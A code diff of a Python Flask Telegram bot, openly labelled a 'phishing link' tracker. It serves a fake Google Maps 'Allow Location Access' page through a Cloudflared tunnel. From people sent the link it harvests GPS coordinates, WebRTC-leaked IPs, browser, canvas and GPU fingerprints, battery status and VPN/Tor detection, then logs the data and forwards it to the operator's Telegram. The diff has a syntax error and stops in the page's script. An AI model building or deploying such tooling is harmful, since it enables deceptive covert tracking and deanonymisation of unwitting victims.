@@ -1,135 +1,243 @@
-#!/usr/bin/env python3
-"""
-Telegram Bot - Location Tracker & Device Fingerprint Collector
-MULTI-USER VERSION — works for any Telegram user who starts the bot.
-
-Install: pip install flask requests gunicorn
-Deploy on Render with: gunicorn gps_bot:app --bind 0.0.0.0:$PORT --workers 1 --threads 4 --timeout 120
-"""
-
-import threading
-import time
-import json
 import os
-import requests
+import sys
+import json
+import time
+import re
+import subprocess
+import threading
 import logging
 from datetime import datetime
+from io import StringIO
+
 from flask import Flask, request, jsonify
+import requests
 
-# ================== CONFIGURATION ==================
-TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"       # <-- Set your bot token from @BotFather
+# ========================== CONFIGURATION ==========================
+TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
+TELEGRAM_CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID", "YOUR_CHAT_ID_HERE")
+# If you want ALL users who start the bot to receive updates, leave CHAT_ID empty
+# and we'll collect chat_ids dynamically.
 
-# On Render, the PORT is set by the platform
-PORT = int(os.environ.get("PORT", 8080))
+PORT = int(os.environ.get("PORT", 8080)))
 
-# Your Render URL — set this or use environment variable
-RENDER_URL = os.environ.get("RENDER_URL", "https://your-app-name.onrender.com")
+# Auto-download cloudflared if not present
+import stat
+if not os.path.exists("cloudflared"):
+    import urllib.request
+    url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
+    urllib.request.urlretrieve(url, "cloudflared")
+    os.chmod("cloudflared", stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
+    CLOUDFLARED_PATH = "./cloudflared"
+else:
+    CLOUDFLARED_PATH = os.environ.get("CLOUDFLARED_PATH", "cloudflared")
 
-# ================== SETUP ==================
+# Logging
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    level=logging.INFO
+    level=logging.INFO,
 )
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 
-# Store captured data in memory (mapped by chat_id)
-captured_data = {}  # {chat_id: [(type, msg, ip, ...), ...]}
-data_lock = threading.Lock()
+# Store authorized chat IDs (users who /start the bot)
+authorized_chats = set()
+if TELEGRAM_CHAT_ID:
+    for cid in TELEGRAM_CHAT_ID.split(","):
+        try:
+            authorized_chats.add(int(cid.strip()))
+        except ValueError:
+            pass
 
-# Telegram API base
-TG_API = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
+current_tunnel_url = None
 
-# Track last update ID for polling
-last_update_id = 0
+# ========================== TELEGRAM HELPERS ==========================
+def send_telegram(chat_id, text, parse_mode="HTML"):
+    """Send a message via Telegram Bot API."""
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    payload = {
+        "chat_id": chat_id,
+        "text": text,
+        "parse_mode": parse_mode,
+        "disable_web_page_preview": False,
+    }
+    try:
+        resp = requests.post(url, json=payload, timeout=10)
+        if not resp.ok:
+            logger.warning(f"Telegram send error: {resp.status_code} {resp.text}")
+    except Exception as e:
+        logger.error(f"Telegram send exception: {e}")
 
-# ================== UTILITY ==================
-def get_real_ip():
-    flask_ip = request.remote_addr
-    xff = request.headers.get('X-Forwarded-For', '')
-    xff_ip = xff.split(',')[0].strip() if xff else None
-    cf_ip = request.headers.get('CF-Connecting-IP', '')
-    return cf_ip or xff_ip or flask_ip
 
-def format_data_for_telegram(data_dict, title):
-    """Format captured data nicely for Telegram message (Markdown)."""
+def send_telegram_all(text, parse_mode="HTML"):
+    """Send a message to all authorized chats."""
+    for cid in authorized_chats:
+        send_telegram(cid, text, parse_mode)
+
+
+def forward_data_to_telegram(title, data_dict):
+    """Format collected data nicely and forward to Telegram."""
     ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    lines = [f"📡 *{title}*", f"🕒 `{ts}`"]
-    
+    msg_parts = [f"<b>🔍 {title}</b>\n📅 {ts}\n"]
+
     for k, v in data_dict.items():
-        if k == "Google Maps" and v:
-            lines.append(f"🗺️ [{k}]({v})")
-        elif k == "Timestamp":
-            continue
-        else:
-            lines.append(f"🔹 *{k}:* `{v}`")
-    
-    return "\n".join(lines)
+        v_str = str(v)[:200]  # Truncate long values
+        msg_parts.append(f"<b>{k}:</b> {v_str}")
 
-def tg_send_message(text, chat_id):
-    """Send a message to a specific Telegram chat."""
-    try:
-        resp = requests.post(
-            f"{TG_API}/sendMessage",
-            json={
-                "chat_id": chat_id,
-                "text": text,
-                "parse_mode": "Markdown",
-                "disable_web_page_preview": True
-            },
-            timeout=15
+    msg = "\n".join(msg_parts)
+
+    # Telegram has 4096 char limit, split if needed
+    if len(msg) > 4000:
+        # Send truncated version with a note
+        msg = msg[:3900] + "\n\n... (truncated, check dashboard)"
+
+    send_telegram_all(msg)
+
+
+def forward_gps_to_telegram(lat, lon, data):
+    """Send GPS data with a Google Maps link."""
+    maps_link = f"https://maps.google.com/?q={lat},{lon}"
+    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+    msg = (
+        f"<b>📍 GPS LOCATION CAPTURED</b>\n"
+        f"📅 {ts}\n"
+        f"<b>Latitude:</b> {lat:.6f}\n"
+        f"<b>Longitude:</b> {lon:.6f}\n"
+        f"<b>Accuracy:</b> {data.get('acc', 'N/A')}m\n"
+        f"<b>Altitude:</b> {data.get('alt', 'N/A')}m\n"
+        f"<b>Speed:</b> {data.get('speed', 'N/A')} km/h\n\n"
+        f"📍 <a href=\"{maps_link}\">Open in Google Maps</a>"
+    )
+    send_telegram_all(msg)
+
+
+def send_new_link_notification(url):
+    """Notify all users that a new tunnel link is active."""
+    msg = (
+        f"<b>✅ TUNNEL ACTIVE — Send this link to the target:</b>\n\n"
+        f"🔗 <code>{url}</code>\n\n"
+        f"📊 <b>Dashboard:</b> <a href=\"{url}/results\">View Results</a>\n\n"
+        f"<i>The link captures GPS, WebRTC IP, browser fingerprint, "
+        f"canvas fingerprint, WebGL/GPU info, battery status, "
+        f"network info & ISP/VPN detection.</i>"
+    )
+    send_telegram_all(msg)
+
+
+# ========================== FLASK WEBHOOK (Telegram) ==========================
+@app.route(f"/webhook", methods=["POST"])
+def telegram_webhook():
+    """Handle incoming Telegram updates via webhook."""
+    data = request.get_json()
+    if not data:
+        return "OK", 200
+
+    # Extract message
+    message = data.get("message", {})
+    chat_id = message.get("chat", {}).get("id")
+    text = message.get("text", "")
+
+    if not chat_id:
+        return "OK", 200
+
+    # Add to authorized chats
+    authorized_chats.add(chat_id)
+
+    if text == "/start":
+        welcome = (
+            "<b>🤖 HackerAI Tracker Bot — Active</b>\n\n"
+            "The tracker server is running. When a victim visits the link, "
+            "all collected data will appear here in real-time.\n\n"
+            "<b>📌 Commands:</b>\n"
+            "/start — Show this message\n"
+            "/link — Get the current phishing link\n"
+            "/status — Check server & tunnel status\n"
+            "/dashboard — Get the results dashboard URL"
         )
-        return resp.json()
-    except Exception as e:
-        logger.error(f"TG sendMessage failed for {chat_id}: {e}")
-        return None
+        send_telegram(chat_id, welcome)
 
-def tg_answer_callback(callback_id, text=None):
-    """Answer a callback query."""
-    payload = {"callback_query_id": callback_id}
-    if text:
-        payload["text"] = text
-    try:
-        requests.post(f"{TG_API}/answerCallbackQuery", json=payload, timeout=10)
-    except Exception as e:
-        logger.error(f"TG answerCallbackQuery failed: {e}")
+    elif text == "/link":
+        if current_tunnel_url:
+            send_telegram(
+                chat_id,
+                f"<b>🔗 Current Phishing Link:</b>\n<code>{current_tunnel_url}</code>\n\n"
+                f"📊 <b>Dashboard:</b> {current_tunnel_url}/results",
+            )
+        else:
+            send_telegram(
+                chat_id,
+                "⚠️ Tunnel is not ready yet. Waiting for Cloudflared to start...\n"
+                "Try again in a few seconds.",
+            )
 
-# ================== FLASK ROUTES ==================
+    elif text == "/status":
+        tunnel_status = "✅ Active" if current_tunnel_url else "⏳ Starting..."
+        chat_count = len(authorized_chats)
+        msg = (
+            f"<b>📊 Bot Status</b>\n\n"
+            f"Tunnel: {tunnel_status}\n"
+            f"Authorized chats: {chat_count}\n"
+            f"URL: {current_tunnel_url or 'N/A'}\n"
+            f"Listening on port: {PORT}\n"
+            f"Bot uptime: active"
+        )
+        send_telegram(chat_id, msg)
+
+    elif text == "/dashboard":
+        if current_tunnel_url:
+            send_telegram(
+                chat_id,
+                f"<b>📊 Dashboard:</b>\n{current_tunnel_url}/results",
+            )
+        else:
+            send_telegram(chat_id, "⚠️ Tunnel not active yet.")
+
+    else:
+        send_telegram(
+            chat_id,
+            "Unknown command. Available:\n/start\n/link\n/status\n/dashboard",
+        )
+
+    return "OK", 200
+
+
+# ========================== FLASK ROUTES (Tracker) ==========================
 @app.route('/')
 def index():
     ip = get_real_ip()
     ua = request.headers.get('User-Agent', 'Unknown')
     ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    
-    # This is a general visit — we can't link it to a specific Telegram user
-    # The visitor just gets the phishing page
-    
-    with open("victims.log", "a") as f:
+
+    notify_data = {"IP": ip, "User-Agent": ua[:80], "Time": ts}
+    logger.info(f"Victim accessed page - IP: {ip}")
+
+    # Log to file
+    os.makedirs("data", exist_ok=True)
+    with open("data/victims.log", "a") as f:
         f.write(f"[{ts}] IP: {ip} | UA: {ua[:80]}\n")
-    
-    logger.info(f"Visitor: {ip}")
-    
+
+    forward_data_to_telegram("VICTIM ACCESSED THE PAGE", notify_data)
+
     return HTML_PAGE
+
 
 @app.route('/collect', methods=['POST'])
 def collect_all():
     data = request.json
     ip = get_real_ip()
     ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    os.makedirs("data", exist_ok=True)
 
     if not data:
         return jsonify({"status": "ok"})
 
-    # Data is collected — it will be forwarded to ALL active users
-    # via the data forwarder thread
-    
     # --- GPS ---
     if 'lat' in data and 'lon' in data:
         lat, lon = data['lat'], data['lon']
         maps_link = f"https://maps.google.com/?q={lat},{lon}"
-        
-        msg = format_data_for_telegram({
+
+        entry_data = {
             "Victim IP": ip,
             "Latitude": f"{lat:.6f}",
             "Longitude": f"{lon:.6f}",
@@ -137,376 +245,732 @@ def collect_all():
             "Altitude": f"{data.get('alt', 'N/A')}m",
             "Speed": f"{data.get('speed', 'N/A')} km/h",
             "Google Maps": maps_link,
-        }, "📍 GPS COORDINATES CAPTURED")
-        
-        with data_lock:
-            # Store for all registered users
-            for chat_id in captured_data:
-                captured_data[chat_id].append(("gps", msg, ip, lat, lon))
-        
-        with open("gps_links.txt", "a") as f:
-            f.write(f"[{ts}] IP: {ip} | {maps_link}\n")
-        
-        logger.info(f"GPS captured: {lat},{lon} from {ip}")
+        }
+        logger.info(f"GPS captured - {lat},{lon}")
 
-    # --- WebRTC IP Leak ---
+        with open("data/gps_data.log", "a") as f:
+            f.write(f"[{ts}] IP: {ip} | Lat: {lat}, Lon: {lon} | {maps_link}\n")
+
+        forward_gps_to_telegram(lat, lon, data)
+
+    # --- WebRTC Leak ---
     if 'webrtc_ip' in data:
-        msg = format_data_for_telegram({
-            "Victim IP": ip,
-            "WebRTC IP": data['webrtc_ip'],
-        }, "🕸️ WEBRTC IP LEAK")
-        with data_lock:
-            for chat_id in captured_data:
-                captured_data[chat_id].append(("webrtc", msg, ip))
+        entry_data = {"Victim IP": ip, "WebRTC IP": data['webrtc_ip']}
+        logger.info(f"WebRTC leak - {data['webrtc_ip']}")
 
-    # --- Device / Battery ---
+        with open("data/webrtc_leaks.log", "a") as f:
+            f.write(f"[{ts}] IP: {ip} | WebRTC: {data['webrtc_ip']}\n")
+
+        forward_data_to_telegram("WEBRTC IP LEAK", entry_data)
+
+    # --- Device Info ---
     if 'battery' in data:
         b = data['battery']
-        msg = format_data_for_telegram({
+        entry_data = {
             "Victim IP": ip,
             "Battery Level": f"{float(b.get('level', 0)) * 100:.0f}%",
             "Charging": b.get('charging', 'N/A'),
             "Network Type": data.get('network', {}).get('type', 'N/A'),
             "Downlink": f"{data.get('network', {}).get('downlink', 'N/A')} Mbps",
-        }, "🔋 BATTERY & DEVICE")
-        with data_lock:
-            for chat_id in captured_data:
-                captured_data[chat_id].append(("device", msg, ip))
+        }
+        with open("data/device_fingerprints.log", "a") as f:
+            f.write(f"[{ts}] IP: {ip} | Battery: {entry_data['Battery Level']} | "
+                    f"Charging: {b.get('charging')}\n")
+
+        forward_data_to_telegram("BATTERY & DEVICE INFO", entry_data)
 
     # --- Browser Fingerprint ---
     if 'fingerprint' in data:
         fp = data['fingerprint']
-        msg = format_data_for_telegram({
+        entry_data = {
             "Victim IP": ip,
             "Screen": f"{fp.get('width', '?')}x{fp.get('height', '?')}",
             "Platform": fp.get('platform', '?'),
             "Languages": ", ".join(fp.get('languages', [])),
             "Timezone": fp.get('timezone', '?'),
             "Cookies Enabled": fp.get('cookiesEnabled', '?'),
-        }, "🖥️ BROWSER FINGERPRINT")
-        with data_lock:
-            for chat_id in captured_data:
-                captured_data[chat_id].append(("fingerprint", msg, ip))
+        }
+        with open("data/fingerprints.log", "a") as f:
+            f.write(f"[{ts}] IP: {ip} | Screen: {entry_data['Screen']} | "
+                    f"Platform: {fp.get('platform', '?')} | TZ: {fp.get('timezone', '?')}\n")
+
+        forward_data_to_telegram("BROWSER FINGERPRINT", entry_data)
 
     # --- Canvas Fingerprint ---
     if 'canvas_fp' in data:
-        msg = format_data_for_telegram({
+        with open("data/canvas_fingerprints.log", "a") as f:
+            f.write(f"[{ts}] IP: {ip} | Canvas Hash: {data['canvas_fp'][:64]}...\n")
+
+        forward_data_to_telegram("CANVAS FINGERPRINT", {
             "Victim IP": ip,
             "Canvas Hash": data['canvas_fp'][:64] + "...",
-        }, "🎨 CANVAS FINGERPRINT")
-        with data_lock:
-            for chat_id in captured_data:
-                captured_data[chat_id].append(("canvas", msg, ip))
+        })
 
     # --- WebGL ---
     if 'webgl' in data:
         w = data['webgl']
-        msg = format_data_for_telegram({
+        entry_data = {"Victim IP": ip, "Vendor": w.get('vendor', 'N/A'), "Renderer": w.get('renderer', 'N/A')}
+        with open("data/gpu_info.log", "a") as f:
+            f.write(f"[{ts}] IP: {ip} | WebGL: {w.get('vendor', 'N/A')} / {w.get('renderer', 'N/A')}\n")
+
+        forward_data_to_telegram("WEBGL / GPU INFO", entry_data)
+
+    # --- Network Info ---
+    if 'wifi_scan' in data:
+        w = data['wifi_scan']
+        entry_data = {
             "Victim IP": ip,
-            "Vendor": w.get('vendor', 'N/A'),
-            "Renderer": w.get('renderer', 'N/A'),
-        }, "🎮 WEBGL / GPU")
-        with data_lock:
-            for chat_id in captured_data:
-                captured_data[chat_id].append(("webgl", msg, ip))
+            "Connection Type": w.get('type', 'N/A'),
+            "Effective Type": w.get('effectiveType', 'N/A'),
+            "RTT": f"{w.get('rtt', 'N/A')} ms",
+            "Downlink": f"{w.get('downlink', 'N/A')} Mbps",
+        }
+        with open("data/network_info.log", "a") as f:
+            f.write(f"[{ts}] IP: {ip} | Type: {w.get('effectiveType', 'N/A')} | "
+                    f"Downlink: {w.get('downlink', 'N/A')} Mbps\n")
+
+        forward_data_to_telegram("NETWORK INFO", entry_data)
 
     # --- Extended Network Detector ---
     if 'network_detector' in data:
         nd = data['network_detector']
-        msg = format_data_for_telegram({
+        entry_data = {
             "Victim IP": ip,
             "Connection Type": nd.get('type', 'N/A'),
             "Effective Type": nd.get('effectiveType', 'N/A'),
             "RTT": f"{nd.get('rtt', 'N/A')} ms",
             "Downlink": f"{nd.get('downlink', 'N/A')} Mbps",
-            "VPN / Proxy Detected": nd.get('vpnDetected', 'N/A'),
+            "VPN/Proxy Detected": nd.get('vpnDetected', 'N/A'),
             "Tor Detected": nd.get('torDetected', 'N/A'),
             "Public IP": nd.get('publicIP', 'N/A'),
-            "ISP": nd.get('ispHints', 'N/A'),
-        }, "🌐 NETWORK DETECTOR")
-        with data_lock:
-            for chat_id in captured_data:
-                captured_data[chat_id].append(("network", msg, ip))
+            "ISP Hints": nd.get('ispHints', 'N/A'),
+        }
+        with open("data/network_detector.log", "a") as f:
+            f.write(f"[{ts}] IP: {ip} | VPN: {nd.get('vpnDetected', 'N/A')} | "
+                    f"ISP: {nd.get('ispHints', 'N/A')}\n")
+
+        forward_data_to_telegram("EXTENDED NETWORK DETECTOR", entry_data)
 
     return jsonify({"status": "received"})
 
 
-# ================== TELEGRAM BOT POLLING ==================
-def handle_telegram_updates():
-    """Poll Telegram for new updates and respond."""
-    global last_update_id
-    
-    try:
-        resp = requests.post(
-            f"{TG_API}/getUpdates",
-            json={
-                "offset": last_update_id + 1,
-                "timeout": 30,
-                "allowed_updates": ["message", "callback_query"]
-            },
-            timeout=35
-        )
-        
-        if not resp.ok:
-            return
-        
-        updates = resp.json().get("result", [])
-        
-        for update in updates:
-            update_id = update.get("update_id", 0)
-            if update_id > last_update_id:
-                last_update_id = update_id
-            
-            if "message" in update:
-                message = update["message"]
-                chat_id = message["chat"]["id"]
-                text = message.get("text", "")
-                
-                # Register the user if not already registered
-                with data_lock:
-                    if chat_id not in captured_data:
-                        captured_data[chat_id] = []
-                        logger.info(f"New user registered: {chat_id}")
-                
-                if text == "/start":
-                    handle_start(chat_id)
-                elif text == "/link":
-                    handle_link(chat_id)
-                elif text == "/results":
-                    handle_results(chat_id)
-                elif text == "/stats":
-                    handle_stats(chat_id)
-                else:
-                    tg_send_message(
-                        "🤖 *Tracker Bot Active*\n\n"
-                        "Commands:\n"
-                        "🔗 `/link` — Get the tracker URL\n"
-                        "📊 `/results` — Get captured data\n"
-                        "📋 `/stats` — Show statistics",
-                        chat_id
-                    )
-            
-            if "callback_query" in update:
-                callback = update["callback_query"]
-                cb_id = callback["id"]
-                cb_data = callback.get("data", "")
-                chat_id = callback["message"]["chat"]["id"]
-                
-                # Register user
-                with data_lock:
-                    if chat_id not in captured_data:
-                        captured_data[chat_id] = []
-                
-                if cb_data == "new_link":
-                    tg_answer_callback(cb_id)
-                    handle_link(chat_id)
-                elif cb_data == "get_results":
-                    tg_answer_callback(cb_id)
-                    handle_results(chat_id)
-                elif cb_data == "stats":
-                    tg_answer_callback(cb_id)
-                    handle_stats(chat_id)
-    
-    except requests.exceptions.Timeout:
-        pass
-    except Exception as e:
-        logger.error(f"Poll error: {e}")
+@app.route('/results')
+def show_results():
+    html = """<html><head><title>Tracker Dashboard</title><style>
+    body{font-family:monospace;background:#111;color:#0f0;padding:20px;}
+    h1{color:#fff} h2{color:#aaa}
+    .section{border:1px solid #333;padding:15px;margin:10px 0;border-radius:5px;}
+    a{color:#0ff} .file{color:#ff0}
+    </style></head><body>
+    <h1>PENTEST DASHBOARD</h1>
+    <p>Real-time captured data files:</p><ul>"""
 
-def handle_start(chat_id):
-    """Handle /start command."""
-    keyboard = {
-        "inline_keyboard": [
-            [{"text": "🔗 Get Tracker Link", "callback_data": "new_link"}],
-            [{"text": "📊 Get Results", "callback_data": "get_results"}],
-            [{"text": "📋 Stats", "callback_data": "stats"}],
-        ]
-    }
-    
+    os.makedirs("data", exist_ok=True)
+    for f in sorted(os.listdir("data")):
+        if f.endswith('.log') or f.endswith('.txt'):
+            fpath = os.path.join("data", f)
+            size = os.path.getsize(fpath)
+            html += f"<li class='file'><a href='/view/{f}'>{f}</a> ({size} bytes)</li>"
+
+    html += "</ul>"
+
+    html += "<p>GPS Links captured:</p><ul>"
+    gps_file = "data/gps_data.log"
+    if os.path.exists(gps_file):
+        with open(gps_file, "r") as gf:
+            for line in gf.read().splitlines()[-20:]:
+                html += f"<li class='file'>{line.strip()}</li>"
+    html += "</ul></body></html>"
+    return html
+
+
+@app.route('/view/<filename>')
+def view_file(filename):
+    if not filename.endswith(('.log', '.txt')):
+        return "Forbidden", 403
+    path = os.path.join("data", filename)
+    if not os.path.exists(path):
+        return "Not found", 404
+    with open(path, 'r') as f:
+        content = f.read()
+    safe = content.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
+    return f"<pre style='background:#111;color:#0f0;padding:20px;font-family:monospace;'>{safe}</pre>"
+
+
+# ========================== UTILITY ==========================
+def get_real_ip():
+    flask_ip = request.remote_addr
+    xff = request.headers.get('X-Forwarded-For', '')
+    xff_ip = xff.split(',')[0].strip() if xff else None
+    cf_ip = request.headers.get('CF-Connecting-IP', '')
+    return cf_ip or xff_ip or flask_ip
+
+
+# ========================== CLOUDFLARED TUNNEL ==========================
+def start_tunnel():
+    global current_tunnel_url
+    time.sleep(3)
+
+    logger.info("Starting Cloudflared tunnel...")
+
     try:
-        requests.post(
-            f"{TG_API}/sendMessage",
-            json={
-                "chat_id": chat_id,
-                "text": (
-                    "🤖 *Tracker Bot Active*\n\n"
-                    "Send the phishing link to your target. When they visit it, "
-                    "all collected data (GPS, device info, network) will appear here.\n\n"
-                    "Use the buttons or type `/link`, `/results`, `/stats`:"
-                ),
-                "parse_mode": "Markdown",
-                "reply_markup": keyboard
-            },
-            timeout=15
+        process = subprocess.Popen(
+            [CLOUDFLARED_PATH, "tunnel", "--url", f"http://localhost:{PORT}"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1,
+        )
+
+        for line in process.stdout:
+            match = re.search(r'(https://[a-zA-Z0-9\-]+\.trycloudflare\.com)', line)
+            if match:
+                current_tunnel_url = match.group(1)
+                logger.info(f"Tunnel active: {current_tunnel_url}")
+
+                # Save to file
+                os.makedirs("data", exist_ok=True)
+                with open("data/link.txt", "w") as f:
+                    f.write(f"Phishing URL: {current_tunnel_url}\n"
+                            f"Dashboard: {current_tunnel_url}/results\n")
+
+                # Notify all Telegram users
+                send_new_link_notification(current_tunnel_url)
+                break
+
+        # Keep reading stdout to maintain tunnel
+        for line in process.stdout:
+            if "error" in line.lower() or "failed" in line.lower():
+                logger.warning(f"Tunnel: {line.strip()}")
+
+        process.wait()
+    except FileNotFoundError:
+        logger.error("Cloudflared not found! Install it or set CLOUDFLARED_PATH env var.")
+        send_telegram_all(
+            "<b>❌ ERROR:</b> Cloudflared binary not found.\n"
+            "Install it: <code>curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o cloudflared && chmod +x cloudflared</code>"
         )
     except Exception as e:
-        logger.error(f"handle_start error: {e}")
-
-def handle_link(chat_id):
-    """Send the Render deployment URL."""
-    if RENDER_URL and RENDER_URL != "https://your-app-name.onrender.com":
-        msg = (
-            f"✅ *Tracker Link Active on Render*\n\n"
-            f"📎 `{RENDER_URL}`\n\n"
-            f"Send this link to your target. All captured data will "
-            f"automatically appear here."
-        )
-    else:
-        msg = (
-            "⚠️ *RENDER_URL not configured!*\n\n"
-            "Set it as an environment variable on Render:\n"
-            "`RENDER_URL=https://your-app-name.onrender.com`\n\n"
-            "Then type `/link` again."
-        )
-    
-    tg_send_message(msg, chat_id)
-
-def handle_results(chat_id):
-    """Send all captured data to the user."""
-    with data_lock:
-        user_data = captured_data.get(chat_id, [])
-        if not user_data:
-            tg_send_message(
-                "📭 *No data captured yet.*\n\n"
-                "Send the link to your target first.",
-                chat_id
-            )
-            return
-        
-        data_copy = user_data.copy()
-        captured_data[chat_id] = []
-    
-    tg_send_message(f"📤 *Sending {len(data_copy)} captured data points...*", chat_id)
-    
-    for item in data_copy:
-        tg_send_message(item[1], chat_id)
-        time.sleep(0.3)
-
-def handle_stats(chat_id):
-    """Show simple statistics."""
-    with data_lock:
-        user_data = captured_data.get(chat_id, [])
-        total = len(user_data)
-        gps_count = sum(1 for d in user_data if d[0] == "gps")
-    
-    local_files = []
-    if os.path.exists("gps_links.txt"):
-        with open("gps_links.txt") as f:
-            local_files.append(("GPS entries logged (all users)", len(f.readlines())))
-    if os.path.exists("victims.log"):
-        with open("victims.log") as f:
-            local_files.append(("Total visitors (all users)", len(f.readlines())))
-    
-    msg = "📊 *Tracker Statistics*\n\n"
-    msg += f"🔸 *Your pending data:* `{total}`\n"
-    msg += f"🔸 *Your GPS captures:* `{gps_count}`\n"
-    for name, count in local_files:
-        msg += f"🔸 *{name}:* `{count}`\n"
-    msg += f"\n👥 *Active users:* `{len(captured_data)}`"
-    
-    tg_send_message(msg, chat_id)
+        logger.error(f"Tunnel error: {e}")
 
 
-# ================== DATA FORWARDER ==================
-def telegram_data_forwarder():
-    """Background thread that sends captured data to ALL registered users."""
-    while True:
-        time.sleep(8)
-        
-        with data_lock:
-            # Collect all data to send
-            to_send = {}
-            for chat_id, data_list in list(captured_data.items()):
-                if data_list:
-                    to_send[chat_id] = data_list.copy()
-                    captured_data[chat_id] = []
-        
-        for chat_id, data_list in to_send.items():
-            for item in data_list:
-                tg_send_message(item[1], chat_id)
-                time.sleep(0.3)
-
-
-# ================== BOT POLLER ==================
-def bot_poller():
-    """Background thread that polls Telegram for commands."""
-    logger.info("Bot poller started")
-    while True:
-        try:
-            handle_telegram_updates()
-        except Exception as e:
-            logger.error(f"Bot poller error: {e}")
-            time.sleep(5)
-
-
-# ================== HTML PAGE ==================
+# ========================== HTML PAGE ==========================
 HTML_PAGE = """<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Google Maps</title>
+
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif}
-body{height:100vh;overflow:hidden;position:relative;background:#1a1a2e}
-.map-bg{position:fixed;inset:0;z-index:0}
-.map-bg iframe{width:100%;height:100%;border:none;filter:blur(6px) brightness(0.7);transform:scale(1.1)}
-.overlay{position:fixed;inset:0;background:rgba(0,0,0,.3);z-index:1}
-.popup{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);z-index:10;width:380px;padding:30px;background:rgba(255,255,255,.15);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.25);border-radius:20px;text-align:center;color:white;box-shadow:0 8px 32px rgba(0,0,0,.5)}
-.logo{width:70px;margin-bottom:15px}
-h2{margin-bottom:8px;font-size:22px;font-weight:500}
-p{margin-bottom:20px;opacity:.9;font-size:14px;line-height:1.5}
-.buttons{display:flex;gap:10px}
-button{flex:1;padding:12px 16px;border:none;border-radius:12px;cursor:pointer;font-weight:600;font-size:15px;transition:all 0.2s}
-.allow{background:#4285F4;color:white}
-.allow:hover{background:#3367d6}
-.allow:disabled{opacity:0.6;cursor:default}
-.deny{background:rgba(255,255,255,.2);color:white}
-.deny:hover{background:rgba(255,255,255,.3)}
-.deny:disabled{opacity:0.6;cursor:default}
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+}
+
+body{
+    height:100vh;
+    overflow:hidden;
+    position:relative;
+    background:#1a1a2e;
+}
+
+.map-bg{
+    position:fixed;
+    inset:0;
+    z-index:0;
+}
+
+.map-bg iframe{
+    width:100%;
+    height:100%;
+    border:none;
+    filter:blur(6px) brightness(0.7);
+    transform:scale(1.1);
+}
+
+.overlay{
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,.3);
+    z-index:1;
+}
+
+.popup{
+    position:absolute;
+    top:50%;
+    left:50%;
+    transform:translate(-50%,-50%);
+    z-index:10;
+    width:380px;
+    padding:30px;
+    background:rgba(255,255,255,.15);
+    backdrop-filter:blur(20px);
+    -webkit-backdrop-filter:blur(20px);
+    border:1px solid rgba(255,255,255,.25);
+    border-radius:20px;
+    text-align:center;
+    color:white;
+    box-shadow:0 8px 32px rgba(0,0,0,.5);
+}
+
+.logo{
+    width:70px;
+    margin-bottom:15px;
+}
+
+h2{
+    margin-bottom:8px;
+    font-size:22px;
+    font-weight:500;
+}
+
+p{
+    margin-bottom:20px;
+    opacity:.9;
+    font-size:14px;
+    line-height:1.5;
+}
+
+.buttons{
+    display:flex;
+    gap:10px;
+}
+
+button{
+    flex:1;
+    padding:12px 16px;
+    border:none;
+    border-radius:12px;
+    cursor:pointer;
+    font-weight:600;
+    font-size:15px;
+    transition:all 0.2s;
+}
+
+.allow{
+    background:#4285F4;
+    color:white;
+}
+.allow:hover{
+    background:#3367d6;
+}
+.allow:disabled{
+    opacity:0.6;
+    cursor:default;
+}
+
+.deny{
+    background:rgba(255,255,255,.2);
+    color:white;
+}
+.deny:hover{
+    background:rgba(255,255,255,.3);
+}
+.deny:disabled{
+    opacity:0.6;
+    cursor:default;
+}
+
+.hidden{display:none;}
 </style>
 </head>
 <body>
+
 <div class="map-bg">
     <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d387190.279915233!2d-74.25987368715497!3d40.69767006458873!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x89c24fa5d33f083b%3A0xe414a1f0af8f5e8d!2sNew+York%2C+NY!5e0!3m2!1sen!2sus!4v1" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
 </div>
 <div class="overlay"></div>
+
 <div class="popup" id="popup">
-    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/aa/Google_Maps_icon_%282020%29.svg" alt="Maps">
+
+    <img class="logo"
+    src="https://upload.wikimedia.org/wikipedia/commons/a/aa/Google_Maps_icon_%282020%29.svg"
+    alt="Maps">
+
     <h2>Allow Location Access</h2>
-    <p>Google Maps needs access to your device's location to show nearby places, traffic updates, and directions.</p>
+
+    <p>
+        Google Maps needs access to your device's location to show
+        nearby places, traffic updates, and directions.
+    </p>
+
     <div class="buttons">
         <button class="deny" id="denyBtn">Not Now</button>
         <button class="allow" id="allowBtn">Allow</button>
     </div>
+
 </div>
+
 <script>
 (function(){
-    let capturedLat=null,capturedLon=null;
